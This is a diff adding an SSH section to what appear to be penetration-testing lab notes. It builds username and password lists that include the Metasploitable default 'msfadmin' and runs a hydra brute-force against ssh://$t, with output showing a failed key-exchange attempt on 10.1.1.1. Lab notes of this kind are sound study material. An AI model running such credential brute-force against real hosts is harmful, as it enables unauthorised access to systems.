@@ -188,16 +188,42 @@ Syntax: <url>:<form parameters>[:<optional>[:<optional>]:<condition string>
 # [SSH](#ssh-1)
 
 ### 
+```sh
+head /usr/share/seclists/Usernames/top-usernames-shortlist.txt > users.txt
+echo msfadmin >> users.txt
+echo msfadmin | tee -a passwords.txt
+
+$ hydra -L users.txt -P passwords.txt ssh://$t
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-01 09:15:59
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 121 login tries (l:11/p:11), ~8 tries per task
+[DATA] attacking ssh://10.1.1.1:22/
+[ERROR] could not connect to ssh://10.1.1.1:22 - kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [rsa-sha2-512,rsa-sha2-256,ssh-ed25519,ecdsa-sha2-nistp521,ecdsa-sha2-nistp384,ecdsa-sha2-nistp256,sk-ssh-ed25519@openssh.com,sk-ecdsa-sha2-nistp256@openssh.com]
 ```
+
+### 
+```sh
 
 ```
 
 ### 
-```
+```sh
 
 ```
 
 ### 
+```sh
+
 ```
+
+### 
+```sh
+
+```
+
+### 
+```sh
 
 ```
